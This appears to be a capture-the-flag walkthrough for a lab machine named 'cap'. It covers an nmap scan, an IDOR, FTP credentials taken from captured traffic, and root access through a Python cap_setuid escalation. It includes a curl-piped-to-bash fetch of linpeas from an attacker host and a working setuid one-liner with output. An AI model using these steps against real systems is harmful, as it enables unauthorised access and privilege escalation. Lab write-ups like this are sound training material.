```bash
nmap -sC -sV -v 10.129.61.97 -Pn
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: gunicorn
|_http-title: Security Dashboard
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```


# FTP (No Anon Logon)
```bash
ftp 10.129.61.97          
Connected to 10.129.61.97.
220 (vsFTPd 3.0.3)
Name (10.129.61.97:kali): 
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
```

# Visiting the Website
![[Pasted image 20260717105613.png]]

# IP Config Directory
![[Pasted image 20260717105705.png]]

# Before the IDOR
![[Pasted image 20260717105843.png]]

# After the IDOR
![[Pasted image 20260717105909.png]]

# FTP Traffic and Credential Capture
![[Pasted image 20260717110333.png]]
Giving the creds of `nathan:Buck3tH4TF0RM3!`

# FTP Login
```bash
ftp nathan@10.129.61.97
Connected to 10.129.61.97.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
ftp> 
```

# SSH Login
```bash
ssh nathan@10.129.61.97     
nathan@10.129.61.97's password: 
nathan@cap:~$ 
```

# Attacker Machine
```bash
curl http://10.10.17.195:4444/linpeas.sh | bash
```

Vulnerability on LinPeas.
```bash
Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

![[Pasted image 20260717113513.png]]

```python
python3 -c "import os; os.setuid(0); os.system('id'); os.system('bash')"
```
![[Pasted image 20260717130346.png]]

```shell
nathan@cap:~$ python3 -c "import os; os.setuid(0); os.system('id'); os.system('bash')"
uid=0(root) gid=1001(nathan) groups=1001(nathan)
root@cap:~# whoami
root
```